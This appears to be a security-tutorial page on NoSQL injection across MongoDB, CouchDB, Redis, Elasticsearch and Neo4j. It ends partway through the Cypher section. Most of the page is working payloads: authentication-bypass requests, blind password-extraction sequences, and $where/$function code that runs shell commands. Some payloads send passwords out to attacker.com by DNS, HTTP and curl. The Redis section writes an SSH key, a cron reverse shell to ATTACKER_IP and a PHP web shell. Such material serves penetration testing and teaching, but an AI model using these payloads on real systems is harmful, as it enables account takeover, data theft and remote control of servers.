---
title: NoSQL Injection Attack
description: Complete breakdown of NoSQL Injection attack vectors, payload collections across MongoDB, CouchDB, Redis, and other NoSQL databases, operator abuse, blind extraction techniques, and privilege escalation from database to operating system.
navigation:
  icon: i-lucide-database-zap
  title: NoSQL Injection
---

## What is NoSQL Injection?

NoSQL Injection is a vulnerability class where an attacker **manipulates queries to NoSQL databases** by injecting malicious operators, objects, or commands through unsanitized user input. Unlike traditional SQL Injection that targets structured query language, NoSQL Injection exploits the **query syntax and operators specific to each NoSQL database** — including MongoDB, CouchDB, Redis, Cassandra, and others.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
NoSQL databases were never **"immune to injection"** — a common misconception. While they don't use SQL syntax, they accept **JSON objects, JavaScript expressions, and special query operators** that can be manipulated just as effectively. The attack surface is different, but the impact is equally devastating — **full authentication bypass, data exfiltration, denial of service, and remote code execution**.
::

The core vulnerability occurs when an application **passes user-controlled data directly into a NoSQL query** without validating the data type or sanitizing operator characters. In MongoDB, for example, an attacker can inject query operators like `$ne`, `$gt`, `$regex`, and `$where` to alter query logic.

```text [Vulnerable Query Construction — MongoDB]
# Application expects a simple string:
db.users.find({ username: "admin", password: "user_input" })

# Attacker sends a JSON object instead of a string:
# password = {"$ne": ""}

# Resulting query:
db.users.find({ username: "admin", password: {"$ne": ""} })

# The $ne (not equal) operator matches ANY non-empty password
# → Authentication bypassed without knowing the password
```

---

## NoSQL vs SQL Injection

Understanding the differences helps structure your testing approach.

::tabs
  :::tabs-item{icon="i-lucide-git-compare" label="Key Differences"}

  | Aspect | SQL Injection | NoSQL Injection |
  |--------|--------------|-----------------|
  | Query Language | SQL (structured, standardized) | Varies per database (JSON, JS, custom) |
  | Injection Vector | String concatenation in SQL | Object/operator injection in queries |
  | Common Payload | `' OR '1'='1` | `{"$ne": ""}` or `{"$gt": ""}` |
  | Data Format | Tabular (rows/columns) | Documents, key-value, graph, columnar |
  | Schema | Fixed schema | Schema-less / dynamic |
  | Operators Abused | `UNION`, `OR`, `AND` | `$ne`, `$gt`, `$regex`, `$where`, `$lookup` |
  | Server-Side Code Exec | Via `xp_cmdshell`, `COPY PROGRAM` | Via `$where` JS eval, `$function`, `mapReduce` |
  | Error Visibility | Often verbose SQL errors | Usually generic JSON errors |
  | Parameterization | Prepared statements | Input type validation, schema enforcement |

  :::

  :::tabs-item{icon="i-lucide-database" label="Affected Databases"}

  | Database | Type | Query Format | Primary Injection Vector |
  |----------|------|-------------|------------------------|
  | MongoDB | Document | JSON/BSON | Operator injection (`$ne`, `$regex`, `$where`) |
  | CouchDB | Document | JSON / HTTP API | Mango query injection, view manipulation |
  | Redis | Key-Value | Command-based | Command injection, Lua script injection |
  | Cassandra | Wide-Column | CQL | CQL injection (similar to SQLi) |
  | DynamoDB | Key-Value/Document | JSON expressions | Condition expression injection |
  | Firebase | Document | JSON rules | Security rule bypass, path manipulation |
  | Elasticsearch | Search | JSON DSL | Query DSL injection, script injection |
  | Neo4j | Graph | Cypher | Cypher injection |
  | Couchbase | Document | N1QL | N1QL injection (SQL-like) |
  | ArangoDB | Multi-model | AQL | AQL injection |

  :::
::

---

## Attack Flow & Methodology

::steps{level="3"}

### Step 1 — Identify the NoSQL Database

Determine which NoSQL database the application uses.

```text [Fingerprinting Techniques]
# HTTP Response Headers
X-Powered-By: Express          → Likely MongoDB (MEAN/MERN stack)
Server: CouchDB                → CouchDB
Server: ArangoDB               → ArangoDB

# Error Messages
"MongoError"                    → MongoDB
"CastError"                    → Mongoose (MongoDB ODM)
"E11000 duplicate key error"   → MongoDB
"BSON field"                   → MongoDB
"ns not found"                 → MongoDB
"$not" / "$and" in errors      → MongoDB operators leaking

# Default Ports (scanning)
27017                          → MongoDB
6379                           → Redis
5984                           → CouchDB
9200                           → Elasticsearch
7474                           → Neo4j
8529                           → ArangoDB
9042                           → Cassandra

# Technology Stack Indicators
/api/ with JSON responses      → Likely document DB
GraphQL endpoint               → Often backed by MongoDB
package.json with "mongoose"   → MongoDB
Gemfile with "mongoid"         → MongoDB
requirements.txt with "pymongo"→ MongoDB
.env with MONGO_URI            → MongoDB
```

### Step 2 — Identify Injection Points

Map all inputs that interact with database queries.

```text [Common Injection Points]
# Authentication endpoints
POST /login                    (username, password fields)
POST /api/auth                 (credentials in JSON body)
POST /register                 (all registration fields)

# Search / Filter endpoints
GET /api/users?role=admin
GET /api/products?price[gt]=100
POST /api/search               (search body)

# API CRUD operations
GET /api/items?filter={}
PUT /api/users/:id
DELETE /api/items?query={}

# URL parameters with bracket notation
?username[$ne]=&password[$ne]=
?filter[status]=active
?sort[field]=name&sort[order]=1

# HTTP Headers
Cookie values containing JSON
Authorization tokens with embedded queries
```

### Step 3 — Test for Injection

Inject operator payloads and observe behavioral changes.

| Test | Input | Expected if Vulnerable |
|------|-------|----------------------|
| Always-true operator | `{"$ne": ""}` | Returns data / bypasses auth |
| Always-false operator | `{"$ne": "correct_value"}` | Different response |
| Greater-than all | `{"$gt": ""}` | Returns all records |
| Regex match-all | `{"$regex": ".*"}` | Returns all records |
| Type mismatch | `{"$type": 2}` (string type) | Returns records where field is string |
| Boolean true condition | `username[$ne]=x&password[$ne]=x` | Authentication bypass |
| Boolean false condition | `username=nonexistent&password[$ne]=x` | No results |

### Step 4 — Extract Data

Use blind techniques, regex extraction, or operator abuse to exfiltrate database contents.

### Step 5 — Escalate Privileges

Leverage server-side JavaScript execution, command injection, or stolen credentials for deeper access.

::

---

## MongoDB Injection Payloads

MongoDB is the **most commonly targeted** NoSQL database due to its widespread use in modern web applications (MEAN, MERN stacks).

### Authentication Bypass

::caution
All payloads are for **authorized security testing and educational purposes only**. Unauthorized access is illegal.
::

::tabs
  :::tabs-item{icon="i-lucide-key-round" label="Operator Injection — JSON Body"}

  ::code-group
  ```http [Basic Auth Bypass — $ne]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": {"$ne": ""}
  }

  # $ne = "not equal to"
  # Matches any document where password is NOT empty string
  # → Bypasses authentication for user "admin"
  ```

  ```http [Auth Bypass — $gt]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": {"$gt": ""}
  }

  # $gt = "greater than"
  # Any non-empty string is "greater than" empty string
  # → Matches admin's password regardless of value
  ```

  ```http [Auth Bypass — $regex]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": {"$regex": ".*"}
  }

  # $regex = regular expression match
  # .* matches any string of any length
  # → Matches any password value
  ```

  ```http [Auth Bypass — $exists]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": {"$exists": true}
  }

  # $exists = field existence check
  # Returns documents where password field exists
  # → Bypasses if app checks for truthy query result
  ```

  ```http [Auth Bypass — $in with Array]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": {"$in": ["admin", "administrator", "root", "superadmin"]},
    "password": {"$ne": ""}
  }

  # $in = matches any value in array
  # Tries multiple admin usernames simultaneously
  ```

  ```http [Auth Bypass — $or Operator]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "$or": [
      {"username": "admin"},
      {"username": "administrator"}
    ],
    "password": {"$ne": ""}
  }
  ```

  ```http [Auth Bypass — Full Wildcard]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": {"$ne": null},
    "password": {"$ne": null}
  }

  # Returns ANY user where both fields are not null
  # Usually returns the first user in the collection (often admin)
  ```

  ```http [Auth Bypass — $nin (not in)]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": {"$nin": [""]}
  }

  # $nin = "not in" array
  # Matches any password not in the provided array
  ```

  ```http [Auth Bypass — Type Coercion]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": true
  }

  # Some drivers/frameworks convert true to match any truthy value
  ```

  ```http [Auth Bypass — $type Operator]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  {
    "username": "admin",
    "password": {"$type": 2}
  }

  # $type: 2 = String type
  # Matches any document where password is a string
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-link" label="URL Parameter Injection"}

  ::code-group
  ```text [URL Param — $ne Operator]
  # Basic bypass via URL parameters
  /api/login?username=admin&password[$ne]=

  # With URL encoding
  /api/login?username=admin&password%5B%24ne%5D=

  # Double encoding
  /api/login?username=admin&password%255B%2524ne%255D=
  ```

  ```text [URL Param — $gt Operator]
  /api/login?username=admin&password[$gt]=
  /api/login?username[$gt]=&password[$gt]=
  ```

  ```text [URL Param — $regex]
  /api/login?username=admin&password[$regex]=.*
  /api/login?username=admin&password[$regex]=.{1,}
  /api/login?username[$regex]=^admin&password[$regex]=.*
  ```

  ```text [URL Param — $exists]
  /api/login?username=admin&password[$exists]=true
  /api/login?username[$exists]=true&password[$exists]=true
  ```

  ```text [URL Param — $in Array]
  /api/login?username[$in][]=admin&username[$in][]=root&password[$ne]=
  /api/login?username[$in][0]=admin&username[$in][1]=administrator&password[$ne]=x
  ```

  ```text [URL Param — $or]
  /api/login?$or[0][username]=admin&$or[1][username]=root&password[$ne]=
  ```

  ```text [URL Param — Combined Operators]
  /api/login?username=admin&password[$ne]=wrong&password[$exists]=true
  /api/login?username[$regex]=^a&password[$gt]=&password[$ne]=null
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-file-code" label="Form Data Injection"}

  ::code-group
  ```http [x-www-form-urlencoded — $ne]
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password[$ne]=
  ```

  ```http [x-www-form-urlencoded — $gt]
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password[$gt]=
  ```

  ```http [x-www-form-urlencoded — $regex]
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username=admin&password[$regex]=.*
  ```

  ```http [x-www-form-urlencoded — Both Fields]
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  username[$ne]=nonexistent&password[$ne]=nonexistent
  ```

  ```http [x-www-form-urlencoded — $or]
  POST /login HTTP/1.1
  Content-Type: application/x-www-form-urlencoded

  $or[0][username]=admin&$or[1][username]=root&password[$ne]=
  ```

  ```http [Multipart Form — Operator Injection]
  POST /login HTTP/1.1
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

  ------WebKitFormBoundary
  Content-Disposition: form-data; name="username"

  admin
  ------WebKitFormBoundary
  Content-Disposition: form-data; name="password[$ne]"


  ------WebKitFormBoundary--
  ```
  ::
  :::
::

### Data Extraction — Operator Abuse

::code-group
```http [Enumerate All Users — $ne with Exclusion]
# Get first user
POST /api/login HTTP/1.1
Content-Type: application/json

{"username": {"$ne": ""}, "password": {"$ne": ""}}
# Returns: user1 (e.g., "admin")

# Get second user (exclude first)
{"username": {"$nin": ["admin"]}, "password": {"$ne": ""}}
# Returns: user2 (e.g., "john")

# Get third user (exclude first two)
{"username": {"$nin": ["admin", "john"]}, "password": {"$ne": ""}}
# Returns: user3 (e.g., "jane")

# Continue until no more users returned
```

```http [Extract User Count]
POST /api/search HTTP/1.1
Content-Type: application/json

# Count users with role "admin"
{"role": "admin"}

# Count all users
{"username": {"$exists": true}}

# Users created after a date
{"created_at": {"$gt": "2024-01-01"}}
```

```http [Enumerate Field Names — $exists]
POST /api/users HTTP/1.1
Content-Type: application/json

# Test if field exists
{"secret_field": {"$exists": true}}
{"api_key": {"$exists": true}}
{"ssn": {"$exists": true}}
{"credit_card": {"$exists": true}}
{"password_reset_token": {"$exists": true}}
{"internal_notes": {"$exists": true}}
{"salary": {"$exists": true}}
{"admin_key": {"$exists": true}}
```

```http [Filter by Field Type — $type]
POST /api/search HTTP/1.1
Content-Type: application/json

# Find documents where 'role' is a string
{"role": {"$type": "string"}}

# Find documents where 'age' is a number
{"age": {"$type": "number"}}

# Find documents with array fields
{"tags": {"$type": "array"}}

# BSON type codes:
# 1 = Double, 2 = String, 3 = Object, 4 = Array
# 7 = ObjectId, 8 = Boolean, 9 = Date, 10 = Null
# 16 = Int32, 18 = Int64
```

```http [Aggregation Pipeline Injection]
POST /api/analytics HTTP/1.1
Content-Type: application/json

{
  "pipeline": [
    {"$match": {"role": "admin"}},
    {"$project": {"username": 1, "password": 1, "email": 1, "api_key": 1}}
  ]
}

# If the app passes pipeline stages directly:
{
  "pipeline": [
    {"$lookup": {
      "from": "users",
      "localField": "user_id",
      "foreignField": "_id",
      "as": "user_data"
    }},
    {"$unwind": "$user_data"},
    {"$project": {"user_data.password": 1, "user_data.email": 1}}
  ]
}
```
::

### Blind NoSQL Injection — Data Extraction

When the application doesn't return query results directly, use regex-based or boolean-based blind techniques.

::tabs
  :::tabs-item{icon="i-lucide-regex" label="Regex-Based Blind Extraction"}

  ::code-group
  ```text [Extract Password — Character by Character]
  # Determine password length
  {"username": "admin", "password": {"$regex": "^.{1}$"}}    → false
  {"username": "admin", "password": {"$regex": "^.{5}$"}}    → false
  {"username": "admin", "password": {"$regex": "^.{8}$"}}    → true (password is 8 chars)

  # Extract first character
  {"username": "admin", "password": {"$regex": "^a"}}        → false
  {"username": "admin", "password": {"$regex": "^b"}}        → false
  {"username": "admin", "password": {"$regex": "^p"}}        → true (starts with 'p')

  # Extract second character
  {"username": "admin", "password": {"$regex": "^pa"}}       → true
  
  # Extract third character
  {"username": "admin", "password": {"$regex": "^pas"}}      → true
  
  # Continue: ^pass → ^passw → ^passwo → ^passwor → ^password
  
  # Final: password = "password" (or whatever the full value is)
  ```

  ```text [Regex with Character Classes]
  # Is first char lowercase letter?
  {"password": {"$regex": "^[a-z]"}}

  # Is first char uppercase?
  {"password": {"$regex": "^[A-Z]"}}

  # Is first char a digit?
  {"password": {"$regex": "^[0-9]"}}

  # Is first char a special character?
  {"password": {"$regex": "^[^a-zA-Z0-9]"}}

  # Binary search approach (faster):
  {"password": {"$regex": "^[a-m]"}}    → narrows to first half
  {"password": {"$regex": "^[a-g]"}}    → narrows further
  {"password": {"$regex": "^[a-d]"}}
  {"password": {"$regex": "^[a-b]"}}
  {"password": {"$regex": "^a"}}        → first char is 'a'
  ```

  ```text [Extract Email via Regex]
  # Determine email domain
  {"username": "admin", "email": {"$regex": "@gmail.com$"}}    → false
  {"username": "admin", "email": {"$regex": "@target.com$"}}   → true

  # Extract email username part
  {"username": "admin", "email": {"$regex": "^a.*@target.com$"}} → true
  {"username": "admin", "email": {"$regex": "^ad.*@target.com$"}} → true
  {"username": "admin", "email": {"$regex": "^adm.*@target.com$"}} → true
  # Continue until full email extracted
  ```

  ```text [Extract Field Values — Special Characters Escaping]
  # When extracting values with regex special chars, escape them:
  # Characters to escape: . * + ? ^ $ { } [ ] | ( ) \

  # If password contains special chars like "P@ss.w0rd!"
  {"password": {"$regex": "^P"}}           → true
  {"password": {"$regex": "^P@"}}          → true  (@ is not special in regex)
  {"password": {"$regex": "^P@ss"}}        → true
  {"password": {"$regex": "^P@ss\\."}}     → true  (\. escapes the dot)
  {"password": {"$regex": "^P@ss\\.w0rd"}} → true
  {"password": {"$regex": "^P@ss\\.w0rd!"}}→ true (! is not special)
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-toggle-left" label="Boolean-Based Blind"}

  ::code-group
  ```text [Boolean Conditions via Operators]
  # True condition — normal response
  {"username": "admin", "password": {"$ne": ""}}
  # Response: {"success": true, ...} or 200 OK

  # False condition — different response
  {"username": "admin", "password": {"$eq": "definitely_wrong_password"}}
  # Response: {"success": false, ...} or 401

  # Use this difference to extract data bit by bit
  ```

  ```text [Boolean via $where (if enabled)]
  # $where allows JavaScript execution
  {"username": "admin", "$where": "this.password.length == 8"}    → true/false
  {"username": "admin", "$where": "this.password[0] == 'p'"}     → true/false
  {"username": "admin", "$where": "this.password.charAt(0) > 'm'"} → true/false

  # ASCII-based extraction
  {"$where": "this.password.charCodeAt(0) > 96"}    → true (lowercase)
  {"$where": "this.password.charCodeAt(0) > 112"}   → true
  {"$where": "this.password.charCodeAt(0) > 120"}   → false
  {"$where": "this.password.charCodeAt(0) == 115"}   → true (char 's')
  ```

  ```http [Conditional Response Analysis]
  # When app returns different content based on query match:

  # Request 1 — True condition
  POST /api/check-user HTTP/1.1
  {"username": "admin", "role": {"$eq": "admin"}}
  # Response: 200 OK, body length: 450 bytes

  # Request 2 — False condition
  POST /api/check-user HTTP/1.1
  {"username": "admin", "role": {"$eq": "user"}}
  # Response: 200 OK, body length: 120 bytes

  # Length difference confirms the admin role value
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-timer" label="Time-Based Blind"}

  ::code-group
  ```http [Time-Based via $where + sleep]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  # Delay if condition is true
  {
    "username": "admin",
    "$where": "if(this.password.length==8){sleep(5000);return true;}else{return false;}"
  }

  # Extract first character
  {
    "username": "admin",
    "$where": "if(this.password[0]=='p'){sleep(5000);return true;}else{return false;}"
  }

  # Binary search with timing
  {
    "$where": "if(this.password.charCodeAt(0)>96){sleep(5000);return true;}else{return false;}"
  }
  ```

  ```http [Time-Based via Regex Complexity (ReDoS)]
  POST /api/login HTTP/1.1
  Content-Type: application/json

  # Crafted regex that causes catastrophic backtracking
  # Only triggers if the field matches initial pattern
  {
    "username": "admin",
    "password": {"$regex": "^p((((((((((((((((((((((((((.*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*$"}
  }
  # If password starts with 'p', regex engine takes significantly longer
  # Measurable delay confirms the character
  ```
  ::
  :::
::

### Server-Side JavaScript Injection

::warning
The `$where` operator and certain MongoDB functions execute **server-side JavaScript**. If user input reaches these, it enables **arbitrary code execution** on the database server.
::

::code-group
```http [$where — JavaScript Execution]
POST /api/search HTTP/1.1
Content-Type: application/json

# Basic JS execution test
{"$where": "1==1"}
{"$where": "true"}
{"$where": "this.username == 'admin'"}

# Information gathering
{"$where": "return true; var x = tojson(this); return true;"}

# Sleep for timing
{"$where": "sleep(5000)"}
{"$where": "function(){sleep(5000);return true;}"}

# Access internal objects
{"$where": "this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"}
```

```http [$where — Data Exfiltration]
POST /api/search HTTP/1.1
Content-Type: application/json

# Exfiltrate via DNS (if network access available)
{
  "$where": "var x = this.password; var net = this.constructor.constructor('return process')().mainModule.require('dns'); net.resolve(x+'.attacker.com','A',function(){}); return true;"
}

# Exfiltrate via HTTP
{
  "$where": "var x = this.password; var http = this.constructor.constructor('return process')().mainModule.require('http'); http.get('http://attacker.com/'+x); return true;"
}
```

```http [$function — MongoDB 4.4+ Server-Side JS]
POST /api/aggregate HTTP/1.1
Content-Type: application/json

{
  "pipeline": [
    {
      "$match": {
        "$expr": {
          "$function": {
            "body": "function() { return true; }",
            "args": [],
            "lang": "js"
          }
        }
      }
    }
  ]
}

# With data exfiltration
{
  "pipeline": [
    {
      "$match": {
        "$expr": {
          "$function": {
            "body": "function() { var proc = this.constructor.constructor('return process')(); proc.mainModule.require('child_process').execSync('curl http://attacker.com/'+this.password); return true; }",
            "args": [],
            "lang": "js"
          }
        }
      }
    }
  ]
}
```

```http [mapReduce — Command Execution]
POST /api/analytics HTTP/1.1
Content-Type: application/json

{
  "mapReduce": "users",
  "map": "function(){ emit(this.username, this.password); }",
  "reduce": "function(key, values){ return values.join(','); }",
  "out": "output_collection"
}

# With code execution
{
  "mapReduce": "users",
  "map": "function(){ var x = this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id').toString(); emit(x, 1); }",
  "reduce": "function(key, values){ return Array.sum(values); }",
  "out": {"inline": 1}
}
```
::

### MongoDB-Specific Advanced Payloads

::accordion
  :::accordion-item{icon="i-lucide-search" label="Aggregation Pipeline Injection"}

  ::code-group
  ```http [$lookup — Cross-Collection Data Access]
  POST /api/reports HTTP/1.1
  Content-Type: application/json

  {
    "pipeline": [
      {
        "$lookup": {
          "from": "users",
          "localField": "user_id",
          "foreignField": "_id",
          "as": "stolen_data"
        }
      },
      {"$unwind": "$stolen_data"},
      {
        "$project": {
          "username": "$stolen_data.username",
          "password": "$stolen_data.password",
          "email": "$stolen_data.email",
          "api_key": "$stolen_data.api_key",
          "ssn": "$stolen_data.ssn"
        }
      }
    ]
  }
  ```

  ```http [$group — Data Aggregation Exfil]
  {
    "pipeline": [
      {"$match": {}},
      {
        "$group": {
          "_id": null,
          "all_usernames": {"$push": "$username"},
          "all_passwords": {"$push": "$password"},
          "all_emails": {"$push": "$email"}
        }
      }
    ]
  }
  ```

  ```http [$unionWith — Access Other Collections (MongoDB 4.4+)]
  {
    "pipeline": [
      {
        "$unionWith": {
          "coll": "admin_secrets",
          "pipeline": [{"$match": {}}]
        }
      }
    ]
  }

  # Combine with $project to extract specific fields
  {
    "pipeline": [
      {"$unionWith": "users"},
      {"$project": {"username": 1, "password": 1, "role": 1}}
    ]
  }
  ```

  ```http [$out / $merge — Write Results to New Collection]
  # Write extracted data to an accessible collection
  {
    "pipeline": [
      {"$match": {"role": "admin"}},
      {"$project": {"username": 1, "password": 1, "api_key": 1}},
      {"$out": "public_data"}
    ]
  }

  # Then access via normal query:
  GET /api/public_data HTTP/1.1
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-settings" label="MongoDB Wire Protocol / Command Injection"}

  ::code-group
  ```http [db.runCommand Injection]
  # If application passes commands directly:
  POST /api/admin/query HTTP/1.1
  Content-Type: application/json

  # List all collections
  {"listCollections": 1}

  # Get server status
  {"serverStatus": 1}

  # Current operations
  {"currentOp": 1}

  # Get users
  {"usersInfo": 1}

  # Get connection info
  {"connectionStatus": 1}

  # Get build info
  {"buildInfo": 1}

  # Get host info
  {"hostInfo": 1}

  # Get replication info
  {"replSetGetStatus": 1}

  # Get log
  {"getLog": "global"}
  ```

  ```http [Admin Commands]
  # Create new user (if admin)
  {
    "createUser": "backdoor",
    "pwd": "hacker123",
    "roles": [{"role": "root", "db": "admin"}]
  }

  # Drop collection
  {"drop": "audit_log"}

  # Shutdown server (DoS)
  {"shutdown": 1}

  # Compact collection (resource exhaustion)
  {"compact": "users"}
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-file-output" label="ObjectId Prediction"}

  ::code-group
  ```text [MongoDB ObjectId Structure]
  # ObjectId is 12 bytes = 24 hex characters
  # Structure: TTTTTTTT MMMMM PP CCCCCC
  # T = 4-byte timestamp (seconds since epoch)
  # M = 5-byte machine/process identifier
  # P = 2-byte (part of random + PID)
  # C = 3-byte incrementing counter

  # Example: 507f1f77bcf86cd799439011
  # Timestamp: 507f1f77 = 1350844279 = Oct 22, 2012
  # Machine:   bcf86cd799
  # Counter:   439011

  # If you know one ObjectId, you can predict nearby ones:
  # Original:  507f1f77bcf86cd799439011
  # Next:      507f1f77bcf86cd799439012
  # Next:      507f1f77bcf86cd799439013
  ```

  ```python [ObjectId Timestamp Extraction]
  from bson import ObjectId
  from datetime import datetime

  # Extract creation timestamp from ObjectId
  oid = ObjectId("507f1f77bcf86cd799439011")
  creation_time = oid.generation_time
  print(f"Created at: {creation_time}")

  # Generate ObjectId for specific timestamp
  target_time = datetime(2024, 1, 15, 12, 0, 0)
  timestamp = int(target_time.timestamp())
  prefix = format(timestamp, '08x')
  
  # Predict ObjectIds around that time:
  # {prefix}0000000000000000 to {prefix}ffffffffffffffff
  print(f"ObjectIds around {target_time} start with: {prefix}")
  
  # Enumerate nearby IDs
  for counter in range(0, 100):
      predicted_id = f"{prefix}bcf86cd799{counter:06x}"
      print(f"Trying: {predicted_id}")
  ```
  ::
  :::
::

---

## Other NoSQL Database Injections

::tabs
  :::tabs-item{icon="i-lucide-database" label="CouchDB Injection"}

  ::code-group
  ```http [CouchDB — Mango Query Injection]
  # CouchDB uses Mango queries (JSON-based)
  POST /db/_find HTTP/1.1
  Content-Type: application/json

  # Auth bypass — $ne operator
  {
    "selector": {
      "username": "admin",
      "password": {"$ne": ""}
    }
  }

  # Regex extraction
  {
    "selector": {
      "username": "admin",
      "password": {"$regex": "^p"}
    }
  }

  # All documents
  {
    "selector": {
      "_id": {"$gt": null}
    }
  }

  # With fields projection
  {
    "selector": {"_id": {"$gt": null}},
    "fields": ["username", "password", "email", "role"]
  }
  ```

  ```http [CouchDB — Direct HTTP API]
  # CouchDB exposes a REST API directly

  # List all databases
  GET /_all_dbs HTTP/1.1

  # Get all documents in a database
  GET /users/_all_docs?include_docs=true HTTP/1.1

  # Access specific document
  GET /users/admin HTTP/1.1

  # Design documents (may contain sensitive views)
  GET /users/_design/auth HTTP/1.1

  # Get database info
  GET /users/ HTTP/1.1

  # Server info
  GET / HTTP/1.1
  GET /_config HTTP/1.1
  GET /_membership HTTP/1.1
  GET /_active_tasks HTTP/1.1
  ```

  ```http [CouchDB — Admin Access]
  # If CouchDB is running in "admin party" mode (no admin set):
  # Full read/write access to everything

  # Create admin user
  PUT /_config/admins/hacker HTTP/1.1
  Content-Type: application/json

  "hacker_password"

  # Create new database
  PUT /exfiltrated_data HTTP/1.1

  # Write document
  PUT /exfiltrated_data/stolen HTTP/1.1
  Content-Type: application/json

  {"data": "stolen_sensitive_data"}

  # Execute JavaScript in views
  PUT /users/_design/evil HTTP/1.1
  Content-Type: application/json

  {
    "views": {
      "passwords": {
        "map": "function(doc) { emit(doc.username, doc.password); }"
      }
    }
  }

  # Query the malicious view
  GET /users/_design/evil/_view/passwords HTTP/1.1
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Redis Injection"}

  ::code-group
  ```text [Redis — Command Injection]
  # If application passes user input to Redis commands:

  # EVAL — Lua script execution
  EVAL "return redis.call('keys','*')" 0
  EVAL "return redis.call('get','admin_session')" 0
  EVAL "return redis.call('hgetall','user:admin')" 0

  # Via CRLF injection in application
  # Normal: SET session:abc "user_data"
  # Injected: SET session:abc "user_data"\r\nGET admin_password\r\n

  # Key enumeration
  KEYS *
  KEYS user:*
  KEYS session:*
  KEYS secret:*
  KEYS api_key:*

  # Get all data from hash
  HGETALL user:admin
  HGETALL config:database
  HGETALL secrets

  # Get strings
  GET admin_password
  GET jwt_secret
  GET api_key
  GET encryption_key
  ```

  ```text [Redis — SSRF / File Write for RCE]
  # Write SSH key for server access
  CONFIG SET dir /root/.ssh/
  CONFIG SET dbfilename authorized_keys
  SET payload "\n\nssh-rsa AAAAB3NzaC1yc2EAAA... attacker@evil\n\n"
  SAVE

  # Write crontab for reverse shell
  CONFIG SET dir /var/spool/cron/crontabs/
  CONFIG SET dbfilename root
  SET payload "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
  SAVE

  # Write web shell
  CONFIG SET dir /var/www/html/
  CONFIG SET dbfilename shell.php
  SET payload "<?php system($_GET['cmd']); ?>"
  SAVE

  # Module loading (Redis 4.x+)
  MODULE LOAD /path/to/malicious.so
  ```

  ```python [Redis — SSRF via Protocol Smuggling]
  # If application has SSRF, target internal Redis
  # Redis protocol (RESP) can be smuggled via HTTP

  # Generate Redis protocol payload
  import urllib.parse

  def gen_redis_payload(*commands):
      payload = ""
      for cmd in commands:
          parts = cmd.split()
          payload += f"*{len(parts)}\r\n"
          for part in parts:
              payload += f"${len(part)}\r\n{part}\r\n"
      return payload

  # SSH key write
  ssh_key = "\\n\\nssh-rsa AAAAB3... attacker@evil\\n\\n"
  payload = gen_redis_payload(
      f"SET payload {ssh_key}",
      "CONFIG SET dir /root/.ssh/",
      "CONFIG SET dbfilename authorized_keys",
      "SAVE"
  )

  # URL encode for SSRF
  ssrf_url = f"gopher://127.0.0.1:6379/_{urllib.parse.quote(payload)}"
  print(f"SSRF URL: {ssrf_url}")
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-search" label="Elasticsearch Injection"}

  ::code-group
  ```http [Elasticsearch — Query DSL Injection]
  # If user input is placed into Elasticsearch queries:

  # Match all documents
  POST /index/_search HTTP/1.1
  Content-Type: application/json

  {
    "query": {
      "match_all": {}
    }
  }

  # Wildcard search — dump all data
  {
    "query": {
      "wildcard": {
        "password": "*"
      }
    },
    "_source": ["username", "password", "email", "ssn"]
  }

  # Bool query injection
  {
    "query": {
      "bool": {
        "should": [
          {"match_all": {}}
        ]
      }
    },
    "size": 10000
  }
  ```

  ```http [Elasticsearch — Script Injection]
  # Painless script execution
  {
    "query": {
      "bool": {
        "filter": {
          "script": {
            "script": {
              "source": "doc['role'].value == 'admin'",
              "lang": "painless"
            }
          }
        }
      }
    }
  }

  # Script fields for data extraction
  {
    "script_fields": {
      "extracted": {
        "script": {
          "source": "doc['password.keyword'].value",
          "lang": "painless"
        }
      }
    }
  }

  # Older versions — Groovy sandbox escape (pre-5.x)
  {
    "script_fields": {
      "rce": {
        "script": "Runtime.getRuntime().exec('id')"
      }
    }
  }
  ```

  ```http [Elasticsearch — Direct API Access]
  # If Elasticsearch is exposed without auth:

  # Cluster info
  GET / HTTP/1.1

  # List all indices
  GET /_cat/indices?v HTTP/1.1

  # Dump index mapping (schema)
  GET /users/_mapping HTTP/1.1

  # Search all documents in index
  GET /users/_search?size=10000 HTTP/1.1

  # Cluster health
  GET /_cluster/health HTTP/1.1

  # Node info (may reveal internal IPs)
  GET /_nodes HTTP/1.1

  # Snapshot repositories
  GET /_snapshot HTTP/1.1
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-git-branch" label="Neo4j Cypher Injection"}

  ::code-group
  ```text [Cypher Query Injection]
  # Neo4j uses Cypher query language for graph databases

  # Auth bypass
  # Normal: MATCH (u:User {username: 'INPUT', password: 'INPUT'}) RETURN u
  # Injected:
  '}) RETURN u UNION MATCH (u:User) RETURN u //
  '}) RETURN u UNION MATCH (a) RETURN a //

  # Extract all nodes
  ' OR 1=1 WITH 1 as a MATCH (n) RETURN n //
  ' OR 1=1 WITH 1 as a MATCH (n) RETURN n.username, n.password //

